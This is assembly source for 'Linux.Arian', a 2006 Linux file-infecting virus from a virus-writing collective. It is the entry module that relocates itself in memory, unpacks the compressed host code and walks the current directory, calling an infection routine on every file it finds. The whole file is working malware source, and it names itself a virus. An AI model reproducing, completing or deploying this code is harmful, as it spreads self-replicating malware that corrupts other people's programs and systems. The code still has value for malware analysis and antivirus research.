; By using this file, you agree to the terms and conditions set
; forth in the COPYING file which can be found at the top level
; of this distribution.
;
;------------------------------------------------------------------------------
; Linux.Arian herm1t@vx.netlux.org 2006-05-24
;
		BITS	32
		CPU	386
		global	_start

%include 'macros.inc'
%include 'constants.inc'

%ifdef		ARI
%define		CTEMP_SIZE	3374
%define		compress	ari_compress
%define		expand		ari_expand
%elifdef	LZW
%define		CTEMP_SIZE	90225
%define		compress	lzw_compress
%define		expand		lzw_expand
%else
%error	You need compression for this virus!
%endif
%ifndef	SAFE_BRK
%if	LINUX == 24
%define	SAFE_BRK
%endif
%endif

_start:		push	strict dword _start
old_entry	equ	$-4
		pusha
%ifdef DEBUG
		push	0xdeadc01d
		call	hex_print
%endif	
		mov	ecx, strict dword PAGE_SIZE
memsize		equ	$-4

		; alloc memory
		push	ebp
		mov	eax, SYS_mmap2
		xor	ebx, ebx
		mov	edx, PROT_READ|PROT_WRITE 
		mov	esi, MAP_ANONYMOUS|MAP_PRIVATE
		xor	edi, edi
		xor	ebp, ebp
		int	0x80
		pop	ebp
		cmp	eax, 0xfffff000
		ja	.fatal
		xchg	eax, edx

		; copy the whole section to allocated memory
		push	ecx
		call	get_delta
		xchg	ebx, eax
		mov	esi, ebx
		mov	edi, edx
		cld
		rep	movsb
		pop	ecx

		; make it R/X
		push	edx
		push	ebx		
		movb	eax, SYS_mprotect
		mov	ebx, edx
		movb	edx, PROT_READ|PROT_EXEC
		int	0x80
		pop	ebx
		pop	edx
		or	eax, eax
		jnz	.fatal	

		; continue at new location
		lea	eax, [edx + O(.run)]
		jmp	eax
.run:
		; ecx - memsize
		; ebx - start at former location
		; edx - start at new location
		; ebp - old stack
		mov	edi, ebx
		mov	eax, ebx
		and	ebx, 0xfffff000
		sub	eax, ebx		; delta between page aligned and raw address of .text section
		add	ecx, eax

		push	edx
		; mprotect .text segment R/W
		movb	eax, SYS_mprotect
		movb	edx, PROT_READ|PROT_WRITE
		int	0x80
		pop	edx
		or	eax, eax
		jnz	.fatal
		
		; unpack host code
		sub	esp, CTEMP_SIZE
		push	esp			;tmp
		push	edi			;dst
		lea	eax, [edx + O(code)]
		push	eax			;src
		call	expand
		add	esp, (CTEMP_SIZE + 12)

		; mprotect .text segment R/X
		movb	eax, SYS_mprotect
		movb	edx, PROT_READ|PROT_EXEC
		int	0x80
		or	eax, eax
		jnz	.fatal

		; find victim
		mov	edx, DIRENT_SIZE
		sub	esp, edx
		mov	ebx, esp
		mov	word [ebx], 0x2e		; "."
		movb	eax, 5
		movb	ecx, 0				; O_RDONLY
		int	0x80				; open
		or	eax, eax
		js	.open_error
		xchg	eax, ebx
.read_dir:	mov	ecx, esp
		movb	eax, SYS_readdir
		int	0x80				; readdir
		dec	eax
		jnz	.all_done
		lea	eax, [esp + DIRENT_DNAME]
		push	eax
		; infect it
		call	infect_file
		jmp	.read_dir
.all_done:	movb	eax, SYS_close
		int	0x80				; close
.open_error:	add	esp, edx

.error:		popa
		ret
; there are nothing we can do, exit(2) ...
.fatal:		movb	eax, SYS_exit
		movb	ebx, 2
		int	0x80

%include 'misc.asm'
%ifdef 		ARI		
%include 'ari.inc'
%elifdef 	LZW
%include 'lzw.inc'
%endif
%include 'infect.asm'

VIRUS_SIZE	equ	O($)
; fake host
code:
%ifdef ARI
		db	0x12,0x8d,0xea,0x49,0x84,0x5b,0xeb,0xff
		db	0x8f,0xa1,0x4a,0xfc,0x2f,0x9d,0xb2,0x18
		db	0xc3,0x21,0x97,0x31,0x03,0x96,0x04,0x45
		db	0x38,0xeb,0x14,0x20,0x97,0xb0,0xbf,0x02
		db	0xa0,0x00,0x11,0xfc,0x6f,0xf0,0xfd,0x24
		db	0x78,0xfe,0xff,0xff,0xff,0xff,0xff,0xff
		db	0xff,0xff,0xff,0xff,0xff,0x9f,0x3a
%elifdef LZW
		db	0xb8,0x00,0x01,0x00,0x00,0x08,0x04,0xbb
		db	0x80,0x40,0x20,0x10,0xa0,0x03,0x0e,0x40
		db	0x41,0x80,0x04,0x94,0x01,0x6c,0x00,0x1b
		db	0xf0,0x06,0xb0,0x00,0x20,0xc0,0x1d,0xf0
		db	0x06,0xc8,0x01,0x6c,0x00,0x19,0x10,0x02
		db	0x28,0x00,0x59,0x80,0x2e,0x80,0x10,0x08
		db	0x04,0xcd,0x00,0x20,0x80,0x0b,0x04,0x00
		db	0x05,0x41,0x0c,0xb0,0x0d,0x70,0x04,0x05
		db	0x01,0x49,0x50,0x12,0x98,0x04,0x27,0xc1
		db	0x49,0xf0,0xff,0x03,0x00
%endif
endcode:
		section	.data
		pp	'*** VIRUS SIZE IS', VIRUS_SIZE
;EOF
